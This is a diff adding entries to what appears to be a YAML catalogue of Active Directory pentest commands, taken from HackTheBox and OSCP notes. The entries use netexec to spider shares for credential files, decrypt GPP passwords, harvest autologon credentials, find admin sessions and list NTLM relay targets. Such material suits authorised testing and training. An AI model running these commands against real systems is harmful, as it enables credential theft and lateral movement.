@@ -79,3 +79,52 @@
   why: "rpcclient getdompwinfo reads the password policy anonymously — read-only recon"
   command: "rpcclient -U '' -N {target} -c getdompwinfo"
 # source: Obsidian: 0.00 Methdology/.../OSCP Random/oncybersec.md
+
+# --- CrackMapExec / netexec — credentialed AD enum (HTB AD Path) ----------------------------------
+# {user}/{password} pre-fill from the first collected credential. All read-only enumeration.
+- description: "Spider ALL readable shares (recursive file metadata)"
+  why: "netexec -M spider_plus lists every file across all shares and saves JSON metadata — the fast way to find interesting files (configs, backups, .kdbx). Read-only."
+  command: "netexec smb {target} -u '{user}' -p '{password}' -M spider_plus"
+  requires: ["creds"]
+# source: HTB AD Path/Using CrackMapExec
+
+- description: "Spider shares AND download matched files"
+  why: "spider_plus with DOWNLOAD_FLAG pulls the files it finds to ~/.nxc/modules/nxc_spider_plus/. Edit the pattern to target creds/configs. Read-only (download)."
+  command: "netexec smb {target} -u '{user}' -p '{password}' -M spider_plus -o DOWNLOAD_FLAG=true EXCLUDE_DIR=IPC$"
+  requires: ["creds"]
+# source: HTB AD Path/Using CrackMapExec
+
+- description: "Find files by name/regex in a share"
+  why: "--spider <share> --regex hunts a share for matching filenames (passwords, config, unattend, web.config, .kdbx). Read-only recon."
+  command: "netexec smb {target} -u '{user}' -p '{password}' --share SYSVOL --spider . --regex '(?i)(pass|cred|unattend|web\\.config|\\.kdbx)'"
+  requires: ["creds"]
+# source: HTB AD Path/Using CrackMapExec
+
+- description: "GPP passwords from SYSVOL (groups.xml)"
+  why: "netexec -M gpp_password decrypts Group Policy Preferences cpassword blobs in SYSVOL to plaintext — a classic AD win. Read-only."
+  command: "netexec smb {target} -u '{user}' -p '{password}' -M gpp_password"
+  requires: ["creds"]
+# source: HTB AD Path/Using CrackMapExec
+
+- description: "GPP autologon creds (registry.xml)"
+  why: "netexec -M gpp_autologin finds autologon username/password pushed via GPP in SYSVOL. Read-only."
+  command: "netexec smb {target} -u '{user}' -p '{password}' -M gpp_autologin"
+  requires: ["creds"]
+# source: HTB AD Path/Using CrackMapExec
+
+- description: "Credentialed shares + users + pass-pol"
+  why: "With a valid cred, list shares/perms, domain users, and the password policy in one credentialed sweep. Read-only."
+  command: "netexec smb {target} -u '{user}' -p '{password}' --shares --users --pass-pol"
+  requires: ["creds"]
+# source: HTB AD Path/Using CrackMapExec
+
+- description: "Logged-on users + sessions + disks"
+  why: "Map where accounts are logged in (hunt for admin sessions) and enumerate sessions/disks. Read-only recon."
+  command: "netexec smb {target} -u '{user}' -p '{password}' --loggedon-users --sessions --disks"
+  requires: ["creds"]
+# source: HTB AD Path/Using CrackMapExec
+
+- description: "Find SMB-signing-disabled hosts (relay targets)"
+  why: "--gen-relay-list writes hosts with SMB signing OFF to a file — the target list for an NTLM relay. Edit {target} to a /24. Read-only enumeration."
+  command: "netexec smb {target}/24 --gen-relay-list relay_targets.txt"
+# source: HTB AD Path/Using CrackMapExec
